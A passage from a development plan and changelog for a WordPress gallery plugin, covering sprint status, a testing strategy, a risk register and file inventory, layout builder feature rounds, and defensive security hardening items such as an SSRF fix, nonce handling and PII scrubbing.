| 1 | **P20-D** — Post meta sanitize callbacks | None | Low | ✅ Complete |
| 2 | **P20-B** — Import payload deep sanitization | P20-C (needs `wpsg_sanitize_css_value()`) | Low | ✅ Complete |
| 2 | **P20-F** — License, headers & legal | None | Low | ✅ Complete |
| 3 | **P20-E** — Uninstall cleanup | None | Medium | ✅ Complete |
| 3 | **P20-G** — GitHub Actions CI pipeline | None | Medium | Not started |
| 4 | **P20-H** — Security hardening sprint | P20-A through P20-G complete | Low–Medium | ✅ 12/12 complete |
| 5 | **P20-I** — Performance optimizations | P20-H complete | Medium–High | ✅ Complete |
| 6 | **P20-J** — Plugin directory preparation | P20-F (license), P20-E (uninstall) | Low | ✅ Complete |
| 1 | **P20-K** — JWT nonce-only default | None | Low | ✅ Complete |
| 2 | **P20-L** — SVG dual-layer sanitization | P20-C (CSS sanitizer pattern) | Medium | ✅ Complete |

Tracks in the same sprint row can be parallelised. Run `npx vitest run`, `npx tsc --noEmit`, `npm run build:wp`, and PHPUnit after every sprint.

---

## Testing Strategy

| Track | New test files | Key scenarios |
|-------|----------------|---------------|
| P20-A | Extend `WPSG_Rate_Limiter_Test.php` | Default 60/min triggers 429; authenticated 120/min triggers 429; filter override works |
| P20-B | `WPSG_Import_Sanitization_Test.php` (new) | Import with `<script>` in slots; import with `javascript:` in layers; import with CSS injection in background; clean import succeeds |
| P20-C | `WPSG_CSS_Sanitization_Test.php` (new) | Each CSS type (color, clip-path, position) with valid + malicious values; universal rejection patterns |
| P20-D | Extend `WPSG_Campaign_Rest_Test.php` | Native REST write with invalid visibility/status; write with malicious media_items URLs |
| P20-E | Manual test procedure + PHPUnit smoke | Install → populate → uninstall → verify no WPSG artifacts remain |
| P20-F | Manual verification | `wp plugin list` shows correct license; header fields present |
| P20-G | CI pipeline self-tests on first PR | Green pipeline = validation |
| P20-H | `parseProps.test.ts` (new), extend `apiClient.test.ts`, extend `ErrorBoundary.test.tsx`, `WPSG_DNS_Rebinding_Test.php` (new) | Per-sub-task as noted in P20-H |
| P20-I | `WPSG_Layout_CPT_Migration_Test.php` (new), `WPSG_Media_Refs_Test.php` (new), extend `main.test.tsx` | Migration roundtrip; reverse index correctness; shared root renders multiple galleries |
| P20-J | `readme.txt` validator (online tool), i18n string extraction verification | Validator passes; `.pot` file contains expected strings |
| P20-K | `WpJwtProvider.test.ts` (extend), `useNonceHeartbeat.test.ts` (new), `AuthContext.test.tsx` (extend), `WPSG_Cookie_Auth_Test.php` (new) | JWT code commented out; nonce-only requests succeed; heartbeat refreshes nonce before expiry; env var opt-in re-enables JWT; cookie login/logout via REST; brute-force hook fires on bad credentials |
| P20-L | `WPSG_SVG_Sanitization_Test.php` (new), `SvgOverlay.test.tsx` (new), `DOMPurify` integration in `OverlayRenderer.test.tsx` | Upload rejects polyglot SVG; `<script>` stripped server-side; `onload` stripped client-side; `@font-face` with data: font preserved; external URI blocked |

---

## Risk Register

| Risk | Impact | Likelihood | Mitigation |
|------|--------|------------|------------|
| CSS allowlist regex too restrictive — rejects valid user CSS values | Medium | Medium | Test against existing layout templates in dev data; log rejected values in debug mode for a sprint before hard-enforcing |
| Import sanitization refactor breaks existing import/export round-trip | High | Low | Add a PHPUnit test that exports a campaign, imports it, and verifies identical output before touching the code |
| `uninstall.php` deletes data when user intended to keep it | High | Medium | Require explicit `wpsg_preserve_data_on_uninstall` option (default: clean); show a notice in Settings explaining the behavior |
| GitHub Actions matrix (8 combinations) is slow / expensive | Low | Medium | Use `fail-fast: false` so one failure doesn't cancel others; consider running full matrix on `main` only, single PHP version on PRs |
| Layout template CPT migration fails mid-way | High | Low | Backup to `wpsg_layout_templates_backup` option before migration; WP-CLI rollback command; migration is idempotent (safe to re-run) |
| Shared React root breaks existing single-shortcode behavior | High | Medium | Feature-flag behind `WPSG_SHARED_ROOT` constant (default: `false` in P20); enable by default only after field testing |
| i18n wrapping changes break existing string matching in tests | Medium | Medium | Run full test suite after each i18n batch; use snapshot testing for component output |
| DNS rebinding fix breaks legitimate oEmbed providers behind CDNs | Medium | Low | Maintain an allowlist of known oEmbed providers (YouTube, Vimeo, etc.) that bypass the private-IP check |
| LIKE-based cache invalidation removal causes stale cache issues | Medium | Low | Set conservative TTL (5 minutes); monitor cache hit rates in staging before production |
| Custom capability type breaks existing admin access | High | Low | Add capabilities to existing roles in a migration; verify with integration test that current admins retain access |
| Nonce expiry in long-open tabs causes silent auth failures | Medium | Medium | `useNonceHeartbeat` hook refreshes nonce via `wp_rest` heartbeat every 10 minutes; show toast on 403 with retry prompt |
| Commenting out JWT breaks cross-origin deployments | Medium | Low | Environment variable `WPSG_ENABLE_JWT=1` re-enables JWT path; documented in README and inline comments |
| SVG sanitizer bypass via novel vector | High | Low | Dual-layer defense (server + client); DOMPurify updated via Dependabot; CSP `style-src` restricts inline styles |
| DOMPurify version drift introduces regression | Medium | Low | Pin DOMPurify minor version; Dependabot PR triggers full test suite including SVG render tests |
| `@font-face` data: URI allowlist too permissive | Low | Low | Only `data:font/woff`, `data:font/woff2`, `data:application/font-woff` allowed; test suite includes malicious font URI cases |

---

## Modified File Inventory (projected)

### New files

| File | Track |
|------|-------|
| `wp-plugin/wp-super-gallery/uninstall.php` | P20-E |
| `wp-plugin/wp-super-gallery/LICENSE` | P20-F |
| `.github/workflows/ci.yml` | P20-G |
| `wp-plugin/wp-super-gallery/tests/WPSG_Import_Sanitization_Test.php` | P20-B |
| `wp-plugin/wp-super-gallery/tests/WPSG_CSS_Sanitization_Test.php` | P20-C |
| `wp-plugin/wp-super-gallery/tests/WPSG_DNS_Rebinding_Test.php` | P20-H |
| `wp-plugin/wp-super-gallery/tests/WPSG_Layout_CPT_Migration_Test.php` | P20-I |
| `wp-plugin/wp-super-gallery/tests/WPSG_Media_Refs_Test.php` | P20-I |
| `wp-plugin/wp-super-gallery/readme.txt` | P20-J |
| `wp-plugin/wp-super-gallery/languages/wp-super-gallery.pot` | P20-J |
| `src/test/parseProps.test.ts` | P20-H |
| `src/hooks/useNonceHeartbeat.ts` | P20-K |
| `src/hooks/useNonceHeartbeat.test.ts` | P20-K |
| `wp-plugin/wp-super-gallery/tests/WPSG_Cookie_Auth_Test.php` | P20-K |
| `wp-plugin/wp-super-gallery/tests/WPSG_SVG_Sanitization_Test.php` | P20-L |
| `src/components/Overlays/SvgOverlay.test.tsx` | P20-L |
| `wp-plugin/wp-super-gallery/includes/class-wpsg-svg-sanitizer.php` | P20-L |
| `wp-plugin/wp-super-gallery/.htaccess` (SVG Content-Type headers) | P20-L |

### Modified files

| File | Tracks | Change summary |
|------|--------|---------------|
| `wp-plugin/.../class-wpsg-rest.php` | P20-A, P20-B, P20-D, P20-H, P20-K | Rate limit defaults; import sanitization refactor; status/visibility whitelist; nonce bypass removal; password reset URL fix; cookie-based auth/login and auth/logout endpoints; nonce refresh endpoint |
| `wp-plugin/.../class-wpsg-layout-templates.php` | P20-C | Add `wpsg_sanitize_css_value()` helper; replace `sanitize_text_field()` with allowlist validation |
| `wp-plugin/.../class-wpsg-cpt.php` | P20-D, P20-J | Add `sanitize_callback` to all `register_post_meta` calls; custom capability type |
| `wp-plugin/.../wp-super-gallery.php` | P20-F, P20-H | Plugin header fields; CSP header setup |
| `wp-plugin/.../class-wpsg-rate-limiter.php` | P20-A | Ensure 60-second default window |
| `wp-plugin/.../class-wpsg-overlay-library.php` | P20-H | Delete physical files on overlay removal |
| `wp-plugin/.../class-wpsg-sentry.php` | P20-H | Fix `captureMessage` signature; add PII scrubbing |
| `wp-plugin/.../class-wpsg-db.php` | P20-I | `wpsg_media_refs` table creation; layout CPT migration |
| `wp-plugin/.../class-wpsg-thumbnail-cache.php` | P20-I | Replace LIKE invalidation with version counter |
| `wp-plugin/.../class-wpsg-monitoring.php` | P20-I | Async email dispatch via cron queue |
| `wp-plugin/.../class-wpsg-settings.php` | P20-E | Add `wpsg_preserve_data_on_uninstall` option |
| `wp-plugin/.../composer.json` | P20-J | Move test deps to `require-dev` |
| `src/main.tsx` | P20-H, P20-I | Props whitelist in `parseProps()`; shared root portal pattern |
| `src/App.tsx` | P20-I | Shared provider extraction for multi-shortcode |
| `src/services/apiClient.ts` | P20-H | Request timeout; `encodeURIComponent` on URL segments |
| `src/services/monitoring/sentry.ts` | P20-H | PII scrubbing `beforeSend` |
| `src/services/monitoring/webVitals.ts` | P20-H | Gate `console.info` behind `import.meta.env.DEV` |
| `src/components/ErrorBoundary.tsx` | P20-H | Sentry `captureException` integration |
| `src/components/Admin/AdminPanel.tsx` | P20-I | Lazy-load `LayoutBuilderModal` |
| `.circleci/config.yml` | P20-G | Renamed to `.circleci/config.yml.legacy` |
| `wp-plugin/.../tests/WPSG_Rate_Limiter_Test.php` | P20-A | Extend with default rate limit tests |
| `wp-plugin/.../tests/WPSG_Campaign_Rest_Test.php` | P20-D | Extend with native REST meta write tests |
| `src/contexts/WpJwtProvider.tsx` | P20-K | Comment out JWT localStorage logic; add env-var opt-in gate |
| `src/contexts/AuthContext.tsx` | P20-K | Remove JWT path from default auth flow; add nonce-only fallback |
| `src/services/apiClient.ts` | P20-K | Default to nonce header (`X-WP-Nonce`); remove Bearer token injection unless opt-in |
| `src/App.tsx` | P20-K | Wire `useNonceHeartbeat`; remove `WpJwtProvider` from default provider tree |
| `wp-plugin/.../class-wpsg-rest.php` | P20-K, P20-L | JWT endpoint guards (comment out token issue/refresh); SVG upload validation hook |
| `wp-plugin/.../class-wpsg-overlay-library.php` | P20-L | SVG sanitization on upload; `Content-Type` header enforcement on serve |
| `wp-plugin/.../composer.json` | P20-L | Add `enshrined/svg-sanitize: ^0.20` to `require` |
| `src/components/Overlays/OverlayRenderer.tsx` | P20-L | DOMPurify pass on SVG before DOM injection |
| `src/components/Admin/OverlayUploadModal.tsx` | P20-L | DOMPurify preview sanitization on upload dialog |

---

*Plan written: March 4, 2026. Updated: March 8, 2026 — Sprint 1 complete (P20-A, P20-C, P20-D, P20-K); QA Rounds 2–5 applied.*

---

## Layout Builder QA — Round 3 Features

**Status:** ✅ Complete  
**Date:** March 7, 2026  

### 1. Advanced Gradient Controls

Upgraded gradient background system from basic 4-direction presets to full type-specific controls.

| Feature | Description |
|---------|-------------|
| Gradient types | Linear, Radial, and Conic gradient support via SegmentedControl |
| Linear controls | Direction preset icons + custom angle input (0–360°) |
| Radial controls | Shape (ellipse/circle), size (4 CSS keywords), center X/Y sliders |
| Conic controls | Starting angle input, center X/Y sliders |
| Stop positions | Per-stop position sliders (0–100%) for all gradient color stops |
| Preview swatch | Live CSS gradient preview uses `templateToGradientOpts()` |

**Files:** `src/utils/gradientCss.ts` (complete rewrite), `src/components/Admin/LayoutBuilder/LayoutBuilderMediaPanel.tsx`, `src/hooks/useLayoutBuilderState.ts` (6 new actions), `src/components/Admin/LayoutBuilder/LayoutCanvas.tsx`, `src/gallery-adapters/layout-builder/LayoutBuilderGallery.tsx`

### 2. Mask Sub-Layer System

Introduced Photoshop-style mask layers with positioning, scaling, and canvas-draggable interaction.

| Feature | Description |
|---------|-------------|
| MaskLayer object | New `MaskLayer` interface: url, mode, x, y, width, height, feather |
| Position & scale | X/Y position and W/H scale controls in properties panel |
| Canvas draggable | Semi-transparent mask overlay in edit mode — drag to reposition mask |
| Auto-fit button | Resets mask to 100% size centered on slot |
| Feather slider | Canvas-based alpha channel blur (0–50px) via offscreen canvas StackBlur |
| Mode toggle | Luminance / Alpha mask mode selector |
| Backward compat | Legacy `maskUrl`/`maskMode` fields kept in sync with `maskLayer` |

**Files:** `src/types/index.ts` (`MaskLayer`, `DEFAULT_MASK_LAYER`), `src/utils/maskFeather.ts` (new), `src/hooks/useFeatheredMask.ts` (new), `src/components/Admin/LayoutBuilder/LayoutSlotComponent.tsx` (`MaskDragOverlay` component), `src/components/Admin/LayoutBuilder/SlotPropertiesPanel.tsx`

### 3. Image Effects System (5 Categories)

Added comprehensive per-slot image effects with full UI controls and CSS rendering.

| Category | Controls | CSS Output |
|----------|----------|-----------|
| Filters | 8 sliders: brightness, contrast, saturate, blur, grayscale, sepia, hue-rotate, invert | `filter:` chain |
| Shadow/Glow | Enable toggle, offset X/Y, blur radius, color picker | `drop-shadow()` in filter chain |
| 3D Tilt | Enable, max angle, perspective, reset speed | `perspective()` + `rotateX/Y()` on mouse move |
| Blend Modes | 16-option select (multiply, screen, overlay, etc.) | `mix-blend-mode` |
| Overlay | None/Darken/Lighten, intensity slider, hover-only toggle | Positioned rgba `<div>` |

**Files:** `src/types/index.ts` (5 new interfaces), `src/utils/slotEffects.ts` (new), `src/components/Admin/LayoutBuilder/SlotPropertiesPanel.tsx`, `src/components/Admin/LayoutBuilder/LayoutSlotComponent.tsx`, `src/gallery-adapters/layout-builder/LayoutBuilderGallery.tsx` (`TiltWrapper` + `GallerySlotView` components)

### 4. PHP Sanitization

All new fields fully sanitized in `class-wpsg-layout-templates.php`:

| Method | Fields |
|--------|--------|
| `build_template()` | `backgroundGradientType` (allowlist), `backgroundGradientAngle` (0–360), `backgroundRadialShape` (allowlist), `backgroundRadialSize` (allowlist), `backgroundGradientCenterX/Y` (0–100) |
| `sanitize_mask_layer()` | url (esc_url_raw), mode (allowlist), x/y (float), width/height (≥1), feather (0–50) |
| `sanitize_filter_effects()` | 8 numeric fields with min/max clamps |
| `sanitize_shadow()` | offsetX/Y (±50), blur (0–50), color |
| `sanitize_tilt()` | enabled (bool), maxAngle (1–45), perspective (100–5000), resetSpeed (50–2000) |
| `sanitize_blend_mode()` | Allowlist of 16 CSS blend modes |
| `sanitize_overlay_effect()` | mode (allowlist), intensity (0–1), onHoverOnly (bool) |

### Type Changes

- `LayoutSlot` extended: `maskLayer?`, `filterEffects?`, `shadow?`, `tilt?`, `blendMode?`, `overlayEffect?`
- `LayoutTemplate` extended: `backgroundGradientType?`, `backgroundGradientAngle?`, `backgroundRadialShape?`, `backgroundRadialSize?`, `backgroundGradientCenterX?`, `backgroundGradientCenterY?`
- New types: `GradientType`, `RadialShape`, `RadialSize`, `MaskLayer`, `SlotFilterEffects`, `SlotShadow`, `SlotTiltEffect`, `SlotBlendMode`, `SlotOverlayEffect`
- New utility files: `src/utils/maskFeather.ts`, `src/utils/slotEffects.ts`, `src/hooks/useFeatheredMask.ts`

---

## Layout Builder QA — Round 5 Changes

**Status:** ✅ Complete  
**Date:** March 8, 2026  

### 1. Bug Fixes

| # | Issue | Root Cause | Fix | File(s) |
|---|-------|-----------|-----|---------|
| R5-1 | PHP `sanitize_filter_effects()` clamped brightness/contrast to 0–200 but UI allowed 0–300 | Range mismatch between PHP sanitizer and frontend slider | Corrected PHP ranges: brightness 0–300, contrast 0–300, grayscale 0–100, sepia 0–100 | `class-wpsg-layout-templates.php` |
| R5-2 | Glow hover displaced when slot uses a `clip-path` shape | Glow `box-shadow` applied to an element with clip-path — CSS clips the shadow to the path boundary | Added an outer wrapper `<div>` for glow that sits behind the clipped slot; glow spread uses `filter: drop-shadow()` on the wrapper to follow path shape | `LayoutBuilderGallery.tsx` |

### 2. Per-Slot Glow Color & Spread

Added `glowColor` and `glowSpread` to the `LayoutSlot` type, allowing per-slot override of campaign-level glow settings.

| Feature | Description |
|---------|-------------|
| `LayoutSlot.glowColor` | Optional hex color string, overrides `settings.tileGlowColor` |
| `LayoutSlot.glowSpread` | Optional number (2–60px), overrides `settings.tileGlowSpread` |
| Slot UI | `ColorInput` + `Slider` controls in SlotPropertiesPanel, shown only when `hoverEffect === 'glow'` |
| Rendering | `LayoutBuilderGallery.tsx` prefers `slot.glowColor` over campaign-level value |
| PHP | Hex color validated via `/^#[0-9a-fA-F]{6,8}$/`, spread clamped 2–60 in `class-wpsg-layout-templates.php` |

### 3. Mask Sublayer UX Overhaul

Upgraded the mask layer system from an inline section in SlotPropertiesPanel to a full Photoshop-style sublayer workflow.

| Feature | Description |
|---------|-------------|
| **Add Mask button** | New `IconMask` toolbar button in the Layers panel — enabled when a single slot without a mask is selected. Opens native file picker (PNG/SVG), uploads via overlay-library endpoint, creates `maskLayer` with `DEFAULT_MASK_LAYER` values, and auto-selects the new mask sublayer. |
| **MaskPropertiesPanel** | Dedicated properties panel (`MaskPropertiesPanel.tsx`) shown when a mask sublayer is clicked in the Layers panel. Contains: preview thumbnail, mode toggle (luminance/alpha), X/Y position, W/H scale, auto-fit button, feather slider, replace/remove actions. |
| **Contextual panel routing** | `LayoutBuilderPropertiesPanel.tsx` now checks `selectedMaskSlotId` — shows "MASK PROPERTIES" header + `MaskPropertiesPanel` when a mask sublayer is selected, "SLOT PROPERTIES" + `SlotPropertiesPanel` otherwise. |
| **Slot panel cleanup** | Removed entire mask section (~180 lines) from `SlotPropertiesPanel.tsx` including upload, mode, position, scale, feather, replace/remove controls. Cleaned up unused imports (`FileButton`, `Loader`, `IconUpload`, `IconFocusCentered`, `MaskLayer`, `DEFAULT_MASK_LAYER`). |

**Files:** `src/components/Admin/LayoutBuilder/MaskPropertiesPanel.tsx` (new), `src/components/Admin/LayoutBuilder/LayoutBuilderPropertiesPanel.tsx`, `src/components/Admin/LayoutBuilder/LayoutBuilderLayersPanel.tsx`, `src/components/Admin/LayoutBuilder/SlotPropertiesPanel.tsx`

### 4. Layout Canvas Height Flexibility

Added `canvasHeightMode` and `canvasHeightVh` to `LayoutTemplate` type, allowing templates to use fixed viewport-height sizing.

### 5. Mobile Breakpoint Guard

Layout Builder modal now shows an informational message and disables editing when the viewport is below the mobile breakpoint (768px).

### 6. URL Image Input Removal

Disabled `imageUrl` text input pathways from slot properties and media panels to enforce media-library-only image sourcing.

### 7. Documentation Updates

| Document | Change |
|----------|--------|
| `TESTING_QA.md` | Added Phase 20 QA Round 5 manual test sections R5-A through R5-F |
| `GALLERY_SETTINGS_AUDIT.md` | Added ~200-line "Addendum: Gallery Adapter Assignment" covering the full adapter resolution chain (sections A-1 through A-9) |

### Type & Backend Changes (Round 5)

- `LayoutSlot` extended: `glowColor?: string`, `glowSpread?: number`
- `LayoutTemplate` extended: `canvasHeightMode?: 'auto' | 'fixed-vh'`, `canvasHeightVh?: number`
- PHP `sanitize_slot()`: added `glowColor` (hex validation), `glowSpread` (clamped 2–60)
- PHP `sanitize_filter_effects()`: corrected brightness/contrast ranges (0–300), grayscale/sepia (0–100)
- New file: `src/components/Admin/LayoutBuilder/MaskPropertiesPanel.tsx`

---

## Layout Builder QA — Round 6 Changes

**Status:** ✅ Complete  
**Date:** March 9, 2026  

### A. Mask Layer Fixes

| # | Issue | Root Cause | Fix | File(s) |
|---|-------|-----------|-----|---------|
| A1 | "Add Mask" opened file picker immediately | `handleAddMask` created a hidden `<input type="file">` and `.click()`-ed it | Changed to create empty mask layer (`url: ''`) without file picker; MaskPropertiesPanel handles the no-image state | `LayoutBuilderLayersPanel.tsx` |
| A2 | Mask panel had no Design Assets picker | MaskPropertiesPanel only offered upload | Added `overlayLibrary` prop, rendered `DesignAssetsGrid` with click-to-apply; added drop-zone on preview area (drag asset → apply as mask) | `MaskPropertiesPanel.tsx`, `LayoutBuilderPropertiesPanel.tsx` |
| A3 | Mask position controls had no visible effect | CSS `mask-position` with percentages at `mask-size: 100%` has no visible effect (CSS spec: % positioning relates to surplus space) | Converted to pixel-based: `mask-position: ${(x/100)*pixelWidth}px ${(y/100)*pixelHeight}px` | `LayoutSlotComponent.tsx`, `LayoutBuilderGallery.tsx` |
| A4 | Adding a mask broke base image drag | `MaskDragOverlay` at `z-index: 5` with `pointerEvents: 'auto'` intercepted all mouse events | Added `isMaskSelected` prop chain from context → canvas → slot; overlay only interactive when mask sublayer is selected | `LayoutSlotComponent.tsx`, `LayoutCanvas.tsx`, `LayoutBuilderCanvasPanel.tsx` |
| A5 | No way to resize mask on canvas | MaskDragOverlay only supported drag positioning | Added 4 corner resize handles (violet circles) with per-corner mousedown handlers that update `maskLayer.width`/`height` | `LayoutSlotComponent.tsx` |
| — | Stale closure bug in MaskDragOverlay | `onMouseUp` read stale `live` state | Added `liveRef` to track latest drag position; `onMouseUp` reads from ref | `LayoutSlotComponent.tsx` |

### B. Background Panel

| # | Issue | Fix | File(s) |
|---|-------|-----|---------|
| B6 | Background redirected to Media panel on selection | Created dedicated `BackgroundPropertiesPanel` with full mode controls (none/color/gradient/image). Routed via `isBackgroundSelected` in properties panel. Stays open until manually closed. | `BackgroundPropertiesPanel.tsx` (new), `LayoutBuilderPropertiesPanel.tsx` |
| B7 | Background had no Design Assets picker | Added `DesignAssetsGrid` in background panel (shown when mode=image); click-to-apply as background image | `BackgroundPropertiesPanel.tsx` |

### C. Design Assets & Drag-and-Drop

| # | Issue | Fix | File(s) |
|---|-------|-----|---------|
| C8 | "+" button should become drag-to-add | Removed "+" button from asset grid; each asset thumbnail is now `draggable` with `application/x-wpsg-asset-url` MIME type | `DesignAssetsGrid.tsx` (new) |
| C9 | Drag Design Asset to canvas → new graphic layer | Added `onDragOver`/`onDrop` handlers on canvas div; drops create graphic layer at drop position via `builder.addOverlay()` + `builder.moveOverlay()` | `LayoutCanvas.tsx`, `LayoutBuilderCanvasPanel.tsx` |
| C10 | Trash icon below each asset thumbnail | Replaced with small "X" circle overlay at image top-right corner | `DesignAssetsGrid.tsx` |
| C11 | Drag campaign media to canvas → new slot | Canvas drop handler detects `application/x-wpsg-media-id`; creates new slot at drop position via `builder.addSlot()` + `builder.updateSlot()` + `builder.assignMediaToSlot()` | `LayoutCanvas.tsx`, `LayoutBuilderCanvasPanel.tsx` |
| — | Drag asset onto slot with mask → apply as mask | Extended slot `handleDrop` to accept `application/x-wpsg-asset-url`; applies as mask image when slot has a `maskLayer` | `LayoutSlotComponent.tsx` |

### New & Refactored Files (Round 6)

| File | Change |
|------|--------|
| `src/components/Admin/LayoutBuilder/DesignAssetsGrid.tsx` | **New** — Reusable asset grid with click-to-select, drag support, X-overlay delete, scrollable container, active-highlight |
| `src/components/Admin/LayoutBuilder/BackgroundPropertiesPanel.tsx` | **New** — Dedicated background properties panel extracted from `LayoutBuilderMediaPanel.tsx` |
| `src/components/Admin/LayoutBuilder/LayoutBuilderMediaPanel.tsx` | **Refactored** — Removed background controls (moved to BackgroundPropertiesPanel), replaced inline asset grid with `DesignAssetsGrid` |
| `src/components/Admin/LayoutBuilder/MaskPropertiesPanel.tsx` | **Extended** — Added `overlayLibrary` prop, Design Assets grid, drop-zone on preview area |
| `src/components/Admin/LayoutBuilder/LayoutSlotComponent.tsx` | **Extended** — Mask resize handles, asset-to-mask drop, `isMaskSelected` prop, pixel-based mask positioning, stale-closure fix |
| `src/components/Admin/LayoutBuilder/LayoutCanvas.tsx` | **Extended** — Canvas `onDragOver`/`onDrop` for Design Assets and campaign media |
| `src/components/Admin/LayoutBuilder/LayoutBuilderCanvasPanel.tsx` | **Extended** — `handleAssetCanvasDrop`, `handleMediaCanvasDrop` callbacks |
| `src/components/Admin/LayoutBuilder/LayoutBuilderPropertiesPanel.tsx` | **Extended** — Routes to `BackgroundPropertiesPanel` when `isBackgroundSelected`, passes `overlayLibrary` to mask panel |
| `src/gallery-adapters/layout-builder/LayoutBuilderGallery.tsx` | **Extended** — Pixel-based mask positioning in frontend renderer |

---

## Security Hardening Sprint — Round 7 Changes

**Status:** ✅ Complete (5 items)  
**Date:** March 9, 2026  

| # | H-Track Item | Change | File(s) |
|---|-------------|--------|---------|
| H-2 | DNS rebinding SSRF fix | Added `pre_http_request` filter in `proxy_oembed()` that re-resolves the hostname and validates via `is_private_ip()` at HTTP-request time, closing the TOCTOU gap between pre-flight DNS check and actual fetch. Uses `$wpsg_ssrf_blocked` flag + closure with `use (&$wpsg_ssrf_blocked)` to surface a clear 400 response. Filter is added before `WPSG_OEmbed_Providers::fetch()` and removed immediately after. Added public `check_private_ip()` wrapper for closure access. Only active for non-allowlisted hosts. | `class-wpsg-rest.php` |
| H-3 | Remove nonce bypass filter | Replaced `apply_filters('wpsg_require_rest_nonce', …)` with constant-based bypass: requires both `WP_DEBUG` and `WPSG_ALLOW_NONCE_BYPASS` to be true. Updated test bootstrap to define the constant; removed `add_filter`/`remove_filter` from all 3 test setUp/tearDown methods. | `class-wpsg-rest.php`, `tests/bootstrap.php`, `tests/WPSG_Settings_Rest_Test.php`, `tests/WPSG_Capability_Test.php`, `tests/WPSG_Campaign_Rest_Test.php` |
| H-5 | Delete physical files on overlay removal | `remove()` now resolves the overlay URL to a filesystem path via `wp_upload_dir()`, checks `file_exists()`, and calls `wp_delete_file()` before removing the option entry. Only deletes files under the uploads directory. | `class-wpsg-overlay-library.php` |
| H-6 | Sentry PII scrubbing | Added `beforeSend` callback to `Sentry.init()`: strips `Authorization`/`authorization` headers from breadcrumb data, deletes `user.ip_address` if auto-detected. | `src/services/monitoring/sentry.ts` |
| H-8 | ErrorBoundary → Sentry | Added `Sentry.captureException(error, { contexts: { react: { componentStack } } })` in `componentDidCatch`. Imported `@sentry/react`. | `src/components/ErrorBoundary.tsx` |
